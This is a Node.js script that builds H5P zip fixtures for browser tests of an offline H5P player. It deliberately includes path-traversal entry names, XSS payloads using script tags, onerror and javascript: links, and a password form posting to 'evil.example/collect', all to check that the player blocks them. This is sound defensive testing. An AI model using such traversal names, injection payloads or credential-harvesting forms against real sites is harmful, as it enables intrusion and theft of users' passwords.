import { mkdir, readFile, readdir, rm, stat, writeFile } from 'node:fs/promises'
import { resolve, relative, sep } from 'node:path'
import { BlobWriter, TextReader, Uint8ArrayReader, Uint8ArrayWriter, ZipReader, ZipWriter } from '@zip.js/zip.js'
import { GENERATED_FIXTURES } from './lib/fixture-names.mjs'

/**
 * Builds the `.h5p` archives the browser tests play. They are generated rather than committed
 * because two of them need entries no ordinary zip tool will write — a path traversal, and media
 * large enough to take the slice and chunk paths — and because a 20 MB fixture does not belong
 * in git.
 */

const rootDir = resolve(import.meta.dirname, '..')
const sourceDir = resolve(rootDir, 'tests', 'fixtures', 'src', 'basic')
const extraLibDir = resolve(rootDir, 'tests', 'fixtures', 'src', 'extra')
const outDir = resolve(rootDir, 'public', 'fixtures')

/** Comfortably past the 16 MB inline threshold, so these take the large-entry paths. */
const LARGE_ENTRY_SIZE = 20 * 1024 * 1024

async function collectFiles(dir, prefix = '') {
  const found = []
  for (const name of await readdir(dir)) {
    const path = resolve(dir, name)
    const entryName = prefix ? `${prefix}/${name}` : name
    if ((await stat(path)).isDirectory()) {
      found.push(...(await collectFiles(path, entryName)))
    } else {
      found.push({ entryName, path })
    }
  }
  return found
}

async function writeArchive(name, build) {
  const writer = new ZipWriter(new BlobWriter('application/zip'))
  await build(writer)
  const blob = await writer.close()
  const bytes = new Uint8Array(await blob.arrayBuffer())
  await writeFile(resolve(outDir, name), bytes)
  return bytes.length
}

const baseFiles = await collectFiles(sourceDir)

const addBaseFiles = async (writer, { skip = [] } = {}) => {
  for (const { entryName, path } of baseFiles) {
    if (skip.includes(entryName)) continue
    const contents = await readFile(path)
    await writer.add(entryName, new Uint8ArrayReader(new Uint8Array(contents)))
  }
}

/** Highly compressible filler: 20 MB that deflates to a few kilobytes, so the archive stays small. */
const compressibleBytes = () => new Uint8Array(LARGE_ENTRY_SIZE)

/** Incompressible filler: stored either way, and the stored path is what it is here to exercise. */
const randomBytes = () => {
  const bytes = new Uint8Array(LARGE_ENTRY_SIZE)
  // `crypto.getRandomValues` caps at 64 kB per call.
  for (let offset = 0; offset < bytes.length; offset += 65536) {
    crypto.getRandomValues(bytes.subarray(offset, Math.min(offset + 65536, bytes.length)))
  }
  return bytes
}

// Only the archives this script owns are cleared. `public/fixtures/` is where a real `.h5p`
// gets dropped to try against the demo, and wiping the directory would delete it on the next
// `pnpm dev`.
const GENERATED = GENERATED_FIXTURES

await mkdir(outDir, { recursive: true })
for (const name of GENERATED) {
  await rm(resolve(outDir, name), { force: true })
}

const built = []

// 1. The ordinary case: every entry small and deflated.
built.push([
  'basic.h5p',
  await writeArchive('basic.h5p', async (writer) => {
    await addBaseFiles(writer)
  })
])

// 1b. A result and a part: the content type with its Answer button, which reports `answered` as
//     a single question does, and a child of itself run as sub-content, whose Complete reports
//     `completed` with the parent named. Only the content's own statements are its result.
built.push([
  'finished.h5p',
  await writeArchive('finished.h5p', async (writer) => {
    await addBaseFiles(writer, { skip: ['content/content.json'] })
    await writer.add(
      'content/content.json',
      new TextReader(
        JSON.stringify({
          message: 'A result, and a part inside it.',
          answer: true,
          child: { library: 'H5P.OfflineTest 1.0', subContentId: '9d3c1f0a-2b4e-4c6d-8e1f-3a5b7c9d1e2f', params: { message: 'A part.' } }
        })
      )
    )
  })
])

// 2. A large deflated entry: the Jobs worker inflates it into chunks and the virtual server
//    serves the prefix that exists as a shorter 206.
built.push([
  'large-deflated.h5p',
  await writeArchive('large-deflated.h5p', async (writer) => {
    await addBaseFiles(writer, { skip: ['content/content.json'] })
    await writer.add(
      'content/content.json',
      new TextReader(
        JSON.stringify({ message: 'Large deflated media', media: { path: 'media/big.bin' } })
      )
    )
    await writer.add('content/media/big.bin', new Uint8ArrayReader(compressibleBytes()))
    // Large, deflated, and referenced by nothing: the prefetch case. The runtime never asks for
    // it, so an extraction of it can only have been started ahead of demand.
    await writer.add('content/media/unused.bin', new Uint8ArrayReader(compressibleBytes()))
  })
])

// 3. A large stored entry: sliced straight out of the archive, never extracted or stored.
built.push([
  'large-stored.h5p',
  await writeArchive('large-stored.h5p', async (writer) => {
    await addBaseFiles(writer, { skip: ['content/content.json'] })
    await writer.add(
      'content/content.json',
      new TextReader(
        JSON.stringify({ message: 'Large stored media', media: { path: 'media/big.bin' } })
      )
    )
    await writer.add('content/media/big.bin', new Uint8ArrayReader(randomBytes()), { level: 0 })
  })
])

// 3b. A large deflated entry that does not compress: its compressed span is long enough to be
//     fetched in segments over HTTP, which the compressible one above never is — 20 MB of zeros
//     deflate to 20 kB. This is the archive that exercises `segmentedStream` end to end.
built.push([
  'segmented.h5p',
  await writeArchive('segmented.h5p', async (writer) => {
    await addBaseFiles(writer, { skip: ['content/content.json'] })
    await writer.add(
      'content/content.json',
      new TextReader(
        JSON.stringify({ message: 'Large incompressible deflated media', media: { path: 'media/big.bin' } })
      )
    )
    await writer.add('content/media/big.bin', new Uint8ArrayReader(randomBytes()))
  })
])

// 3c. Every entry with a data descriptor — the layout a writer that streams produces, and what
//     h5p.com's exporter ships: sizes after the data, nothing in the local header to skip by.
//     Libraries first and media last, so a host that ignores Range can boot it before the media
//     lands, which is the forward index's whole point.
built.push([
  'streamed.h5p',
  await writeArchive('streamed.h5p', async (writer) => {
    const streamed = (bytes) => new Blob([bytes]).stream()
    const ordered = [...baseFiles]
      .filter(({ entryName }) => entryName !== 'content/content.json')
      .sort((a, b) => Number(a.entryName.startsWith('content/')) - Number(b.entryName.startsWith('content/')))
    for (const { entryName, path } of ordered) {
      await writer.add(entryName, streamed(new Uint8Array(await readFile(path))), { dataDescriptor: true })
    }
    await writer.add(
      'content/content.json',
      streamed(new TextEncoder().encode(JSON.stringify({ message: 'Streamed archive', media: { path: 'media/big.bin' } }))),
      { dataDescriptor: true }
    )
    await writer.add('content/media/big.bin', streamed(compressibleBytes()), { dataDescriptor: true })
  })
])

// 4. Hostile names. A zip tool will not write these, which is exactly why they are here.
built.push([
  'traversal.h5p',
  await writeArchive('traversal.h5p', async (writer) => {
    await addBaseFiles(writer)
    await writer.add('../escaped.js', new TextReader('window.escaped = true'))
    await writer.add('content\\windows.json', new TextReader('{"windows":true}'))
    await writer.add('nested/../../escaped-too.js', new TextReader('window.escapedToo = true'))
  })
])

// 5. Content with no libraries — what h5p.com and h5p.org hand you when the site they came from
//    already has them. The runtime asks for `<MainLibrary>/library.json` and gets nothing.
built.push([
  'content-only.h5p',
  await writeArchive('content-only.h5p', async (writer) => {
    await writer.add(
      'h5p.json',
      new TextReader(
        JSON.stringify({
          title: 'Content without its libraries',
          language: 'en',
          mainLibrary: 'H5P.InteractiveVideo',
          embedTypes: ['iframe'],
          license: 'U',
          // Versions as strings, the way an h5p.org export writes them.
          preloadedDependencies: [
            { machineName: 'H5P.InteractiveVideo', majorVersion: '1', minorVersion: '27' }
          ]
        })
      )
    )
    await writer.add('content/content.json', new TextReader(JSON.stringify({ interactiveVideo: {} })))
  })
])

// 6. The same shape, but for a content type we can supply locally: an export stripped of its
//    libraries, plus a bundle that carries them. Together they have to play.
const OFFLINE_TEST_DEPENDENCY = {
  machineName: 'H5P.OfflineTest',
  majorVersion: '1',
  minorVersion: '0'
}

built.push([
  'needs-libraries.h5p',
  await writeArchive('needs-libraries.h5p', async (writer) => {
    await writer.add(
      'h5p.json',
      new TextReader(
        JSON.stringify({
          title: 'Stripped export',
          language: 'en',
          mainLibrary: 'H5P.OfflineTest',
          embedTypes: ['div'],
          license: 'U',
          // Only the main library, the way a content-only export writes it.
          preloadedDependencies: [OFFLINE_TEST_DEPENDENCY]
        })
      )
    )
    await writer.add(
      'content/content.json',
      new TextReader(JSON.stringify({ message: 'Libraries came from somewhere else.' }))
    )
  })
])

const extraLibFiles = await collectFiles(extraLibDir)

built.push([
  'libraries.h5p',
  await writeArchive('libraries.h5p', async (writer) => {
    for (const { entryName, path } of baseFiles) {
      // Libraries only: no h5p.json of the content's, no content folder.
      if (!entryName.startsWith('H5P.OfflineTest-1.0/')) continue
      await writer.add(entryName, new Uint8ArrayReader(new Uint8Array(await readFile(path))))
    }
    for (const { entryName, path } of extraLibFiles) {
      await writer.add(entryName, new Uint8ArrayReader(new Uint8Array(await readFile(path))))
    }
    await writer.add(
      'h5p.json',
      new TextReader(
        JSON.stringify({
          title: 'Library bundle',
          language: 'und',
          mainLibrary: 'H5P.OfflineTest',
          embedTypes: ['div'],
          license: 'U',
          // H5P.OfflineExtra appears only here. The merged manifest is what makes it load.
          preloadedDependencies: [
            OFFLINE_TEST_DEPENDENCY,
            { machineName: 'H5P.OfflineExtra', majorVersion: '1', minorVersion: '0' }
          ]
        })
      )
    )
  })
])

// 6. A whole package whose content type asks, in its own library.json, for a library the package
//    does not carry and h5p.json does not name: the top-level check passes, and the runtime, which
//    follows every library's dependencies, would end its boot on the 404. The bundle has it.
built.push([
  'needs-dependency.h5p',
  await writeArchive('needs-dependency.h5p', async (writer) => {
    await addBaseFiles(writer, { skip: ['H5P.OfflineTest-1.0/library.json'] })
    const library = JSON.parse(await readFile(resolve(sourceDir, 'H5P.OfflineTest-1.0', 'library.json'), 'utf8'))
    library.preloadedDependencies = [{ machineName: 'H5P.OfflineExtra', majorVersion: 1, minorVersion: 0 }]
    await writer.add('H5P.OfflineTest-1.0/library.json', new TextReader(JSON.stringify(library)))
  })
])

// 6a. A package to play `untrusted`: its own copy of the fixture content type, rewritten to leave
//     a mark when it runs and to say so on screen, which must never happen there — the bundle's
//     copy plays instead — and a file of each kind under `content/`, only some of which may be
//     served. A tiny PNG, so an image is among them.
const PIXEL_PNG = Uint8Array.from(
  atob('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII='),
  (character) => character.charCodeAt(0)
)
const OWN_LIBRARY_SCRIPT = `var H5P = H5P || {};
window.ownLibraryRan = true;
H5P.OfflineTest = function () {
  this.attach = function ($container) {
    $container.html('<p class="h5p-offline-test-message">The package\\'s own code ran.</p>');
  };
};
`
const UNTRUSTED_CONTENT = {
  'content/content.json': JSON.stringify({ message: 'Content from an untrusted package.' }),
  'content/data.json': JSON.stringify({ shown: true }),
  'content/notes.txt': 'window.contentFileRan = true',
  'content/script.js': 'window.contentFileRan = true',
  'content/page.html': '<!doctype html><script>parent.contentFileRan = true</script>',
  'content/drawing.svg': '<svg xmlns="http://www.w3.org/2000/svg"><script>window.contentFileRan = true</script></svg>',
  'content/data.xml': '<data/>',
  'loose.js': 'window.contentFileRan = true'
}

built.push([
  'untrusted.h5p',
  await writeArchive('untrusted.h5p', async (writer) => {
    for (const { entryName, path } of baseFiles) {
      if (entryName === 'content/content.json') continue
      const contents = entryName.endsWith('/offline-test.js') ? new TextEncoder().encode(OWN_LIBRARY_SCRIPT) : new Uint8Array(await readFile(path))
      await writer.add(entryName, new Uint8ArrayReader(contents))
    }
    for (const [entryName, text] of Object.entries(UNTRUSTED_CONTENT)) await writer.add(entryName, new TextReader(text))
    await writer.add('content/images/pixel.png', new Uint8ArrayReader(PIXEL_PNG))
  })
])

// 6a'. One that needs a version of the content type only it carries: refused `untrusted`, with
//      the error saying its own copy would have played it.
built.push([
  'untrusted-newer.h5p',
  await writeArchive('untrusted-newer.h5p', async (writer) => {
    const manifest = JSON.parse(await readFile(resolve(sourceDir, 'h5p.json'), 'utf8'))
    manifest.preloadedDependencies = [{ machineName: 'H5P.OfflineTest', majorVersion: 1, minorVersion: 3 }]
    await writer.add('h5p.json', new TextReader(JSON.stringify(manifest)))
    for (const { entryName, path } of baseFiles) {
      if (entryName === 'h5p.json') continue
      const renamed = entryName.replace(/^H5P\.OfflineTest-1\.0\//, 'H5P.OfflineTest-1.3/')
      let contents = new Uint8Array(await readFile(path))
      if (renamed === 'H5P.OfflineTest-1.3/library.json') {
        contents = new TextEncoder().encode(JSON.stringify({ ...JSON.parse(new TextDecoder().decode(contents)), minorVersion: 3 }))
      }
      await writer.add(renamed, new Uint8ArrayReader(contents))
    }
  })
])

// 6a''. Content to check against the content type's semantics, played with the bundle: markup a
//       field does not allow — a script, a handler, a form asking for a password — a scheme off
//       the list, a field the semantics do not name, and the same in sub-content. Played trusted,
//       all of it reaches the page, where only the frame's policy stops the scripts; untrusted,
//       none of it does.
const MARKUP_CONTENT = {
  message: 'Checked against its semantics.',
  html:
    '<p class="kept">Kept <strong>bold</strong> and <a href="javascript:window.contentScriptRan = true" onclick="window.contentScriptRan = true">a link</a></p>' +
    '<script>window.contentScriptRan = true</script><img src="x" onerror="window.contentScriptRan = true">' +
    '<form action="https://evil.example/collect"><input name="password" placeholder="Your password"></form>',
  stray: '<script>window.contentScriptRan = true</script>',
  child: {
    library: 'H5P.OfflineTest 1.0',
    subContentId: '4f1b0c2e-8a7d-4e3b-9c1a-0d2e3f4a5b6c',
    params: { message: 'A child.', html: '<em>Child</em><script>window.childScriptRan = true</script>' }
  }
}

built.push([
  'untrusted-markup.h5p',
  await writeArchive('untrusted-markup.h5p', async (writer) => {
    await writer.add('h5p.json', new TextReader(await readFile(resolve(sourceDir, 'h5p.json'), 'utf8')))
    await writer.add('content/content.json', new TextReader(JSON.stringify(MARKUP_CONTENT)))
  })
])

// 6a'''. The bundle without the content type's semantics: nothing to check the content against,
//        so an untrusted package does not play.
built.push([
  'libraries-without-semantics.h5p',
  await writeArchive('libraries-without-semantics.h5p', async (writer) => {
    const bundle = new ZipReader(new Uint8ArrayReader(new Uint8Array(await readFile(resolve(outDir, 'libraries.h5p')))))
    for (const entry of await bundle.getEntries()) {
      if (entry.directory || entry.filename.endsWith('/semantics.json')) continue
      await writer.add(entry.filename, new Uint8ArrayReader(await entry.getData(new Uint8ArrayWriter())))
    }
    await bundle.close()
  })
])

// 6b. Content written for older minors than a bundle serves. The bundle carries the fixture
//     content type at 1.2 and a sub-content type at 1.1, each with an `upgrades.js`, and the
//     exports name 1.0 and 1.1: the frame has to run the steps in between before the runtime reads
//     the parameters, as the platforms do when they install a newer minor.
const upgradeLibFiles = await collectFiles(resolve(rootDir, 'tests', 'fixtures', 'src', 'upgrade'))
const offlineTestLibrary = JSON.parse(await readFile(resolve(sourceDir, 'H5P.OfflineTest-1.0', 'library.json'), 'utf8'))

built.push([
  'upgrade-libraries.h5p',
  await writeArchive('upgrade-libraries.h5p', async (writer) => {
    // The content type's own scripts and styles, as 1.2; its upgrade steps come from the source folder.
    for (const { entryName, path } of baseFiles) {
      if (!entryName.startsWith('H5P.OfflineTest-1.0/') || entryName.endsWith('/library.json')) continue
      const name = entryName.replace('H5P.OfflineTest-1.0/', 'H5P.OfflineTest-1.2/')
      await writer.add(name, new Uint8ArrayReader(new Uint8Array(await readFile(path))))
    }
    await writer.add('H5P.OfflineTest-1.2/library.json', new TextReader(JSON.stringify({ ...offlineTestLibrary, minorVersion: 2 })))
    for (const { entryName, path } of upgradeLibFiles) {
      await writer.add(entryName, new Uint8ArrayReader(new Uint8Array(await readFile(path))))
    }
    await writer.add(
      'h5p.json',
      new TextReader(
        JSON.stringify({
          title: 'Library bundle with newer minors',
          language: 'und',
          mainLibrary: 'H5P.OfflineTest',
          embedTypes: ['div'],
          license: 'U',
          preloadedDependencies: [{ machineName: 'H5P.OfflineTest', majorVersion: 1, minorVersion: 2 }]
        })
      )
    )
  })
])

const offlineChild = (version, text) => ({ library: `H5P.OfflineChild ${version}`, params: { text }, subContentId: 'offline-child' })
for (const [name, minor, content] of [
  // Every step of both libraries.
  ['upgrade-1.0.h5p', '0', { message: 'Written for 1.0', child: offlineChild('1.0', 'Child written for 1.0') }],
  // Only the step to 1.2.
  ['upgrade-1.1.h5p', '1', { message: 'Written for 1.1' }],
  // The versions the bundle serves: nothing to run.
  ['upgrade-1.2.h5p', '2', { message: 'Written for 1.2', child: offlineChild('1.1', 'Child written for 1.1') }],
  // The first step throws: played as written.
  ['upgrade-fails.h5p', '0', { message: 'Written for 1.0', failUpgrade: true, child: offlineChild('1.0', 'Child written for 1.0') }]
]) {
  built.push([
    name,
    await writeArchive(name, async (writer) => {
      await writer.add(
        'h5p.json',
        new TextReader(
          JSON.stringify({
            title: `Written for H5P.OfflineTest 1.${minor}`,
            language: 'en',
            mainLibrary: 'H5P.OfflineTest',
            embedTypes: ['div'],
            license: 'U',
            // A stripped export's list: the main library alone, its versions as strings.
            preloadedDependencies: [{ machineName: 'H5P.OfflineTest', majorVersion: '1', minorVersion: minor }]
          })
        )
      )
      await writer.add('content/content.json', new TextReader(JSON.stringify(content)))
    })
  ])
}

// 7. Library folders with no version suffix, the way older packages are built. h5p-standalone
//    probes the versioned name first, takes the 404 and falls back to the bare one.
built.push([
  'unversioned.h5p',
  await writeArchive('unversioned.h5p', async (writer) => {
    for (const { entryName, path } of baseFiles) {
      const bare = entryName.replace(/^H5P\.OfflineTest-1\.0\//, 'H5P.OfflineTest/')
      await writer.add(bare, new Uint8ArrayReader(new Uint8Array(await readFile(path))))
    }
  })
])

// 8. A zip that is not an H5P package at all.
built.push([
  'not-h5p.h5p',
  await writeArchive('not-h5p.h5p', async (writer) => {
    await writer.add('readme.txt', new TextReader('This archive has no h5p.json.'))
  })
])

// 9. Not a zip at all: the index read has to fail cleanly rather than hang.
const garbage = new TextEncoder().encode('this is not a zip archive, not even close\n')
await writeFile(resolve(outDir, 'corrupt.h5p'), garbage)
built.push(['corrupt.h5p', garbage.length])

// 10. An HTML page where the archive should be: a login wall or an error page a host serves
// with status 200 is the common version of this in the wild. The test once got it from the dev
// server's SPA fallback, answering a missing file with the repository's index.html; that page
// moved to the demo app, and a fixture does not depend on where any page lives.
const page = new TextEncoder().encode('<!doctype html>\n<html><head><title>Sign in</title></head><body><form>…</form></body></html>\n')
await writeFile(resolve(outDir, 'html-page.h5p'), page)
built.push(['html-page.h5p', page.length])

for (const [name, size] of built) {
  console.log(`[fixtures] ${name.padEnd(22)} ${(size / 1024).toFixed(1)} kB`)
}
